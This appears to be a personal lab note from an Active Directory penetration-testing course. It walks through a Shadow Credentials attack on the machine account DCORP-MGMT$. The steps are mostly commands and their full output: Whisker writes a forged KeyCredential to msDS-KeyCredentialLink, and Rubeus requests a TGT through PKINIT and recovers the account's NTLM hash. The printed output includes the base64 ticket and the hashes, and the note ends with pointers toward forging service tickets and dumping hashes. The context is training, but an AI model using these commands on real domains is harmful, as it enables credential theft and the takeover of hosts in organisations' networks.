#### Theory can be found in [[2. Domain Privilege Escalation#6. Shadow Credentials]] ####

- Open a new `PowerShell` session as `dcorp\ciadmin` and grant access to the required tools to that user.
```
PS C:\AD\MyTools> runas.exe /user:dcorp\ciadmin powershell
Enter the password for dcorp\ciadmin:
Attempting to start powershell as user "dcorp\ciadmin" ...
PS C:\AD\MyTools> icacls C:\AD\MyTools\* /grant:r dcorp\ciadmin:F
processed file: C:\AD\MyTools\20230820233344_BloodHound.zip
processed file: C:\AD\MyTools\InviShell
processed file: C:\AD\MyTools\mimikatz.exe
processed file: C:\AD\MyTools\OGM1YTI1MzQtMTU4Mi00NWMyLTk2N2YtMWNkYTlkMjE4NTM3.bin
processed file: C:\AD\MyTools\PowerUp.ps1
processed file: C:\AD\MyTools\PowerView.ps1
processed file: C:\AD\MyTools\PrivescCheck.ps1
processed file: C:\AD\MyTools\Rubeus.exe
processed file: C:\AD\MyTools\SharpHound.ps1
processed file: C:\AD\MyTools\Whisker.exe
Successfully processed 10 files; Failed processing 0 files
```

- List existing KeyCredentials for `DCORP-MGMT`.
```
PS C:\AD\MyTools> .\Whisker.exe list /target:DCORP-MGMT$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local
[*] Searching for the target account
[*] Target user found: CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
[*] Listing deviced for DCORP-MGMT$:
[*] No entries!
```

- Generate a KeyCredential structure and write the necessary information as new values of the `msDs-KeyCredentialLink` attribute of `DCORP-MGMT`.
```
PS C:\AD\MyTools> .\Whisker.exe add /target:DCORP-MGMT$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /path:C:\AD\MyTools\mgmt.pfx /password:Password123!
[*] Searching for the target account
[*] Target user found: CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 75aa5043-8b4e-44c6-b5e9-7cdb2f07c505
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saving the associated certificate to file...
[*] The associated certificate was saved to C:\AD\MyTools\mgmt.pfx
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:DCORP-MGMT$ /certificate:C:\AD\MyTools\mgmt.pfx /password:"Password123!" /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /getcredentials /show
```

- Request a TGT with `Rubeus.exe`.
```
PS C:\AD\MyTools> .\Rubeus.exe asktgt /user:DCORP-MGMT$ /certificate:C:\AD\MyTools\mgmt.pfx /password:"Password123!" /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /getcredentials /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=DCORP-MGMT$
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dollarcorp.moneycorp.local\DCORP-MGMT$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/dollarcorp.moneycorp.local
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
  UserName                 :  DCORP-MGMT$
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  8/22/2023 11:26:35 AM
  EndTime                  :  8/22/2023 9:26:35 PM
  RenewTill                :  8/29/2023 11:26:35 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  xuhzxaDBoD30RLfN7JmG5Q==
  ASREP (key)              :  834D3238DE21F2EEB7DA9D61FC316F30

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 0878DA540F45B31B974F73312C18E754
```

- Use the generated TGT to pass it through a session as `dcorp\student303` to access `DCORP-MGMT` through `CIFS` in order to confirm it works (since `dcorp\ciadmin` is a already local administratr to the target server).
- Moreover, with the NT hash of `DCORP-MGMT$` we can craft a TGS for `cifs/dcorp-mgmt.dollarcorp.moneycorp.local` to be able to dump hashes like in [[2. Windows Tools/dollarcorp.moneycorp.local/3. Domain Domination/Path 8 - RBCD|Path 8 - RBCD]]